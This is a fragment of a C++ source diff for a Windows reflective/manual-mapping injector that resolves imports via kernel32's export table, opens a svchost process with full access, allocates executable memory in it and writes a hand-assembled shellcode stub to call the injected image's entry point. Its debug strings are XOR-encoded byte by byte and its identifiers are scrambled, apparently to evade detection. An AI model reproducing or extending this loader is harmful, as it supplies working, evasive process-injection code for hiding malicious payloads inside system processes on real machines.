-		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 114; _fuckingstring[1] = 123; _fuckingstring[2] = 104; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 110; _fuckingstring[6] = 103; _fuckingstring[7] = 33; _fuckingstring[8] = 99; _fuckingstring[9] = 109; _fuckingstring[10] = 110; _fuckingstring[11] = 98; _fuckingstring[12] = 106; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 111; _fuckingstring[16] = 33; _fuckingstring[17] = 115; _fuckingstring[18] = 100; _fuckingstring[19] = 109; _fuckingstring[20] = 110; _fuckingstring[21] = 98; _fuckingstring[22] = 33; _fuckingstring[23] = 100; _fuckingstring[24] = 111; _fuckingstring[25] = 117; _fuckingstring[26] = 115; _fuckingstring[27] = 120; _fuckingstring[28] = 59; _fuckingstring[29] = 33; _fuckingstring[30] = 49; _fuckingstring[31] = 121; _fuckingstring[32] = 36; _fuckingstring[33] = 113; _fuckingstring[34] = 11; _fuckingstring[35] = 1; FBXorCrypt(_fuckingstring, 36);
-		printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock));
+		//PEdll
 
-#endif // jinyongyutiaoshi
+		// windowskernel32
 
-		// uiValueA = the VA for this relocation block
+		// kernel32dllgetmodule
 
-		uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);
+		// uiLibraryAddress = (ULONG_PTR)LoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));
 
+		uiLibraryAddress = _current_process_kern32_base_addr;
 
+		// uiValueD = VA of the OriginalFirstThunk
 
-		// uiValueB = number of entries in this relocation block
-
-		// entry
-
-		uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
+		DWORD64	uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);
 
 
 
-		// uiValueD is now the first entry in the current relocation block
+		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
 
-		// entry
+		// thunkIAT
 
-		DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
+		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);
 
 
 
-		// we itterate through all the entries in the current block...
+		// itterate through all imported functions, importing by ordinal if no name present
 
-		// entry
-
-		while (uiValueB--)
+		while (DEREF(uiValueA))
 
 		{
 
-			// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
+			// sanity check uiValueD as some compilers only import by FirstThunk
 
-			// IMAGE_REL_BASED_ABSOLUTEpadding
-
-			// we dont use a switch statement to avoid the compiler building a jump table
-
-			// which would not be very position independent!
-
-			if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {
+			// ordinalfuncname
 
 
 
-#ifdef jinyongyutiaoshi
+	// uiValueDrvaImportLookupTable0x8000000000000000andordinal
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 96; _fuckingstring[2] = 114; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 115; _fuckingstring[6] = 100; _fuckingstring[7] = 109; _fuckingstring[8] = 110; _fuckingstring[9] = 98; _fuckingstring[10] = 33; _fuckingstring[11] = 110; _fuckingstring[12] = 103; _fuckingstring[13] = 103; _fuckingstring[14] = 114; _fuckingstring[15] = 100; _fuckingstring[16] = 117; _fuckingstring[17] = 59; _fuckingstring[18] = 33; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 113; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
-				printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
+			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 96; _fuckingstring[1] = 103; _fuckingstring[2] = 117; _fuckingstring[3] = 100; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 101; _fuckingstring[9] = 33; _fuckingstring[10] = 117; _fuckingstring[11] = 110; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 109; _fuckingstring[16] = 110; _fuckingstring[17] = 98; _fuckingstring[18] = 33; _fuckingstring[19] = 99; _fuckingstring[20] = 109; _fuckingstring[21] = 110; _fuckingstring[22] = 98; _fuckingstring[23] = 106; _fuckingstring[24] = 33; _fuckingstring[25] = 99; _fuckingstring[26] = 96; _fuckingstring[27] = 114; _fuckingstring[28] = 100; _fuckingstring[29] = 59; _fuckingstring[30] = 33; _fuckingstring[31] = 49; _fuckingstring[32] = 121; _fuckingstring[33] = 36; _fuckingstring[34] = 113; _fuckingstring[35] = 11; _fuckingstring[36] = 1; FBXorCrypt(_fuckingstring, 37);
-				printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
+			{
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 104; _fuckingstring[22] = 117; _fuckingstring[23] = 45; _fuckingstring[24] = 33; _fuckingstring[25] = 69; _fuckingstring[26] = 86; _fuckingstring[27] = 78; _fuckingstring[28] = 83; _fuckingstring[29] = 69; _fuckingstring[30] = 55; _fuckingstring[31] = 53; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 113; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-				printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+				// uiLibraryAddressDLLDLLNT Header
 
-#endif // jinyongyutiaoshi
+				ULONG_PTR	uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
 
-				// delta
 
-				* (ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
 
-#ifdef jinyongyutiaoshi
+				// DLLDATA_DIRECTORY
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 96; _fuckingstring[19] = 103; _fuckingstring[20] = 117; _fuckingstring[21] = 100; _fuckingstring[22] = 115; _fuckingstring[23] = 33; _fuckingstring[24] = 103; _fuckingstring[25] = 104; _fuckingstring[26] = 121; _fuckingstring[27] = 100; _fuckingstring[28] = 101; _fuckingstring[29] = 33; _fuckingstring[30] = 116; _fuckingstring[31] = 113; _fuckingstring[32] = 33; _fuckingstring[33] = 45; _fuckingstring[34] = 33; _fuckingstring[35] = 69; _fuckingstring[36] = 86; _fuckingstring[37] = 78; _fuckingstring[38] = 83; _fuckingstring[39] = 69; _fuckingstring[40] = 55; _fuckingstring[41] = 53; _fuckingstring[42] = 59; _fuckingstring[43] = 33; _fuckingstring[44] = 49; _fuckingstring[45] = 121; _fuckingstring[46] = 36; _fuckingstring[47] = 113; _fuckingstring[48] = 11; _fuckingstring[49] = 1; FBXorCrypt(_fuckingstring, 50);
-				printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+				ULONG_PTR	uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-#endif // jinyongyutiaoshi
+
+
+				// DLL
+
+				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
+
+
+
+				// 
+
+				ULONG_PTR	uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);
+
+
+
+				// ordinalbitordinal
+
+				// and0xFFFF16bitordinal
+
+				// ordinal valuebaseentry4bytes4DLL
+
+				// dlldll
+
+				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
+
+
+
+				// +rvaImportAddressTable
+
+				// kernel32
+
+			//	DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
+
+				DEREF(uiValueA) = (_target_process_kernel32_base_addr + DEREF_32(uiAddressArray));
 
 			}
 
-			else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
+			else
 
-				*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
+			{
 
+				// bit0uiValueDIMAGE_IMPORT_BY_NAMErva
 
+				// PEIMAGE_IMPORT_BY_NAME
 
-			else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
-
-				*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
-
-			else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
-
-				*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
+				uiValueB = (uiBaseAddress + DEREF(uiValueD));
 
 
 
-			// get the next entry in the current relocation block
+				// GetProcAddressrvaImportAddressTable
 
-			uiValueD += sizeof(IMAGE_RELOC);
+				//
+
+				// DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+
+#ifdef jinyongyutiaoshi
+
+				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 116; _fuckingstring[2] = 111; _fuckingstring[3] = 98; _fuckingstring[4] = 117; _fuckingstring[5] = 104; _fuckingstring[6] = 110; _fuckingstring[7] = 111; _fuckingstring[8] = 33; _fuckingstring[9] = 111; _fuckingstring[10] = 96; _fuckingstring[11] = 108; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 114; _fuckingstring[16] = 59; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 114; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
+				printf(_fuckingstring, ((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+
+#endif // jinyongyutiaoshi
+
+
+
+				DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+
+
+
+#ifdef jinyongyutiaoshi
+
+				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 115; _fuckingstring[30] = 100; _fuckingstring[31] = 117; _fuckingstring[32] = 115; _fuckingstring[33] = 104; _fuckingstring[34] = 100; _fuckingstring[35] = 119; _fuckingstring[36] = 100; _fuckingstring[37] = 33; _fuckingstring[38] = 103; _fuckingstring[39] = 115; _fuckingstring[40] = 110; _fuckingstring[41] = 108; _fuckingstring[42] = 33; _fuckingstring[43] = 98; _fuckingstring[44] = 116; _fuckingstring[45] = 115; _fuckingstring[46] = 115; _fuckingstring[47] = 100; _fuckingstring[48] = 111; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 38; _fuckingstring[59] = 114; _fuckingstring[60] = 33; _fuckingstring[61] = 106; _fuckingstring[62] = 100; _fuckingstring[63] = 115; _fuckingstring[64] = 111; _fuckingstring[65] = 100; _fuckingstring[66] = 109; _fuckingstring[67] = 50; _fuckingstring[68] = 51; _fuckingstring[69] = 47; _fuckingstring[70] = 101; _fuckingstring[71] = 109; _fuckingstring[72] = 109; _fuckingstring[73] = 59; _fuckingstring[74] = 33; _fuckingstring[75] = 36; _fuckingstring[76] = 113; _fuckingstring[77] = 11; _fuckingstring[78] = 1; FBXorCrypt(_fuckingstring, 79);
+				printf(_fuckingstring, reinterpret_cast<BYTE*>(_____ashdjoajoidais));
+
+#endif // jinyongyutiaoshi
+
+				DWORD64 _tempoppapsdjioasdjhoiasjda = _____ashdjoajoidais - uiLibraryAddress + _target_process_kernel32_base_addr;
+
+#ifdef jinyongyutiaoshi
+
+				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 116; _fuckingstring[14] = 111; _fuckingstring[15] = 98; _fuckingstring[16] = 117; _fuckingstring[17] = 104; _fuckingstring[18] = 110; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 101; _fuckingstring[24] = 115; _fuckingstring[25] = 100; _fuckingstring[26] = 114; _fuckingstring[27] = 114; _fuckingstring[28] = 33; _fuckingstring[29] = 96; _fuckingstring[30] = 103; _fuckingstring[31] = 117; _fuckingstring[32] = 100; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 103; _fuckingstring[36] = 104; _fuckingstring[37] = 121; _fuckingstring[38] = 100; _fuckingstring[39] = 101; _fuckingstring[40] = 33; _fuckingstring[41] = 104; _fuckingstring[42] = 111; _fuckingstring[43] = 33; _fuckingstring[44] = 117; _fuckingstring[45] = 96; _fuckingstring[46] = 115; _fuckingstring[47] = 102; _fuckingstring[48] = 100; _fuckingstring[49] = 117; _fuckingstring[50] = 33; _fuckingstring[51] = 113; _fuckingstring[52] = 115; _fuckingstring[53] = 110; _fuckingstring[54] = 98; _fuckingstring[55] = 100; _fuckingstring[56] = 114; _fuckingstring[57] = 114; _fuckingstring[58] = 59; _fuckingstring[59] = 33; _fuckingstring[60] = 36; _fuckingstring[61] = 113; _fuckingstring[62] = 11; _fuckingstring[63] = 1; FBXorCrypt(_fuckingstring, 64);
+				printf(_fuckingstring, reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));
+
+#endif // jinyongyutiaoshi
+
+				* reinterpret_cast<DWORD64*>(uiValueA) = _tempoppapsdjioasdjhoiasjda;
+
+			}
+
+			// get the next imported function
+
+			uiValueA += sizeof(ULONG_PTR);
+
+			if (uiValueD)
+
+				uiValueD += sizeof(ULONG_PTR);
 
 		}
 
 
 
-		// get the next entry in the relocation directory
+		// get the next import
 
-		uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
+		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
 
 	}
 
-}
 
 
+	// STEP 5: process all of our images relocations...
 
-// PE
+	// 
 
 
 
-if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))
+	// calculate the base address delta and perform relocations (even if we load at desired image base)
 
-{
+	// daltadelta
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
 
-	exit(-1);
 
-}
 
 
+	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
 
-//
-
-//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
-
-uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 100; _fuckingstring[13] = 111; _fuckingstring[14] = 117; _fuckingstring[15] = 115; _fuckingstring[16] = 120; _fuckingstring[17] = 33; _fuckingstring[18] = 113; _fuckingstring[19] = 110; _fuckingstring[20] = 104; _fuckingstring[21] = 111; _fuckingstring[22] = 117; _fuckingstring[23] = 33; _fuckingstring[24] = 104; _fuckingstring[25] = 111; _fuckingstring[26] = 33; _fuckingstring[27] = 117; _fuckingstring[28] = 96; _fuckingstring[29] = 115; _fuckingstring[30] = 102; _fuckingstring[31] = 100; _fuckingstring[32] = 117; _fuckingstring[33] = 33; _fuckingstring[34] = 113; _fuckingstring[35] = 115; _fuckingstring[36] = 110; _fuckingstring[37] = 98; _fuckingstring[38] = 100; _fuckingstring[39] = 114; _fuckingstring[40] = 114; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 49; _fuckingstring[44] = 121; _fuckingstring[45] = 36; _fuckingstring[46] = 113; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
-printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA));
-
-
-
-// alignrspcallalign rsp
-
-
-
-// align rsp
-
-
-
-void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-BYTE _fuckyou1[12] = { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };
-
-if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
-
-// mov rax, .....
-
-BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };
-
-if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL))
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
-
-//  8bytes
-
-if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL))
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
-
-// call rax
-
-BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };
-
-if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL))
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
-
-
-
-BYTE _CAL_RA___RET_X[5] = { 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };
-
-if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL))
-
-{
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
-
-
-
-//   _2_29bytes
-
-//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
-
-//if (!hw)
-
-//{
-
-//	printf("Process Not found (0x%lX)\n", GetLastError());
-
-//		return -1;
-
-	//}
-
-	/*void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-	if (!base)
+	if (!hw)
 
 	{
 
-		CloseHandle(hw);
-
-		return -1;
-
-	}
-
-	if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))
-
-	{
-
